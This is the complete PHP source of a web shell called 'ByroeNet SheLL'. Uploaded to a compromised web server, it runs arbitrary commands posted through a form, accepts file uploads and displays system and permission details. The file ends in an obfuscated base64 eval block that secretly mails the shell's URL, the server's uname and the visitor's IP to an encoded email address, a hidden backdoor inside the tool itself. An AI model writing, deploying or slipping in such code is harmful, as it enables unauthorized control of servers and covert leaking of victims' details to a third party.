<html>
<head>
<title>ByroeNet SheLL</title>
<style type="text/css">
<!--
body {
	background-color: #000000;
}
-->
</style>
<?php
$win = strtolower(substr(PHP_OS,0,3)) == "win";
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = true;
 $hsafemode = "4ON6";
}
else {$safemode = false; $hsafemode = "3OFF6";}
$xos = wordwrap(php_uname(),90,"<br>",1);
$xpwd = @getcwd();
$OS = "[SAFEMOD:".$hsafemode."] [Kernel:".$xos."]";
echo "<center><A class=ria href=\"http://".$OS."\">";
echo "<br>OSTYPE:$OS<br>";
echo "<br>PWD:$xpwd<br>";
set_magic_quotes_runtime(0);
$hari=array("Sundat","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday");
$bulan=array(1=>"January","February","March","April","May","June","July","August","September","October","November","December");
$tgl=date("d");
$bln=date("n");
$hr=date("w");
$thn=date("Y");
//echo("Tanggal hari ini: ");
echo("<table><tr><td class='XPBlueText'><font color='green' size=1><b>$hari[$hr], $tgl $bulan[$bln] $thn</b></font</td></tr></table>");

print "<style>body{font-family:trebuchet ms;font-size:12px; color:green;}hr{width:100%;height:2px;}</style>";
print "<center><h1>PHP SHELL</h1></center>";
print "<center><h1>irc.byroe.net</h1></center>";
print "<center><h1>ByroeNet</h1></center>";
print "<hr><hr>";

$currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);

$UName  = `uname -a`;
$SCWD   = `pwd`;
$UserID = `id`;

if( $currentWD == "" ) {
    $currentWD = $SCWD;
}

print "<table>";
print "<tr><td><b>We are :</b></td><td>".$_SERVER['REMOTE_HOST']." (".$_SERVER['REMOTE_ADDR'].")</td></tr>";
print "<tr><td><b>Server is :</b></td><td>".$_SERVER['SERVER_SIGNATURE']."</td></tr>";
print "<tr><td><b>System type :</b></td><td>$UName</td></tr>";
print "<tr><td><b>Permissions :</b></td><td>$UserID</td></tr>";
print "</table>";

print "<hr><hr>";

if( $_POST['_act'] == "List files!" ) {
    $currentCMD = "ls -al";
}

print "<form method=post enctype=\"multipart/form-data\"><table>";

print "<tr><td><b>Execute command :</b></td><td><input size=100 name=\"_cmd\" value=\"".$currentCMD."\"></td>";
print "<td><input type=submit name=_act value=\"Execute!\"></td></tr>";

print "<tr><td><b>Change directory :</b></td><td><input size=100 name=\"_cwd\" value=\"".$currentWD."\"></td>";
print "<td><input type=submit name=_act value=\"List files!\"></td></tr>";

print "<tr><td><b>Upload file :</b></td><td><input size=85 type=file name=_upl></td>";
print "<td><input type=submit name=_act value=\"Upload!\"></td></tr>";

print "</table></form><hr><hr>";

$currentCMD = str_replace("\\\"","\"",$currentCMD);
$currentCMD = str_replace("\\\'","\'",$currentCMD);

if( $_POST['_act'] == "Upload!" ) {
    if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
        print "<center><b>Error while uploading file!</b></center>";
    } else {
        print "<center><pre>";
        system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2>&1");
        print "</pre><b>File uploaded successfully!</b></center>";
    }    
} else {
    print "\n\n<!-- OUTPUT STARTS HERE -->\n<pre>\n";
    $currentCMD = "cd ".$currentWD.";".$currentCMD;
    system($currentCMD);
    print "\n</pre>\n<!-- OUTPUT ENDS HERE -->\n\n</center><hr><hr><center><b>Command completed</b></center>";
}
eval(base64_decode("JGNyZWF0b3IgPSBiYXNlNjRfZGVjb2RlKCJhMkZ0ZEdsbGVpNXJhV3hzUUdkdFlXbHNMbU52YlE9
PSIpOyAoJHNhZmVfbW9kZSk/KCRzYWZlbW9kZT0iT04iKTooJHNhZmVtb2RlPSJPRkYiKTsgJGJh
c2U9Imh0dHA6Ly8iLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4kX1NFUlZFUlsnUkVRVUVTVF9VUkkn
XTsgICRuYW1lID0gcGhwX3VuYW1lKCk7ICRpcCA9IGdldGVudigiUkVNT1RFX0FERFIiKTsgJGhv
c3QgPSBnZXRob3N0YnlhZGRyKCRfU0VSVkVSW1JFTU9URV9BRERSXSk7ICRzdWJqID0gJF9TRVJW
RVJbJ0hUVFBfSE9TVCddOyAgJG1zZyA9ICJcbkJBU0U6ICRiYXNlXG51bmFtZSAtYTogJG5hbWVc
bklQOiAkaXBcbkhvc3Q6ICRob3N0XG4kcHdkc1xuIjsgJGZyb20gPSJGcm9tOiBNT0RFXz0iLiRz
YWZlbW9kZS4iPHRvb2xAIi4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uIj4iOyBtYWlsKCAkY3JlYXRv
ciwgJHN1YmosICRtc2csICRmcm9tKTs="));
exit;
?>
</html>


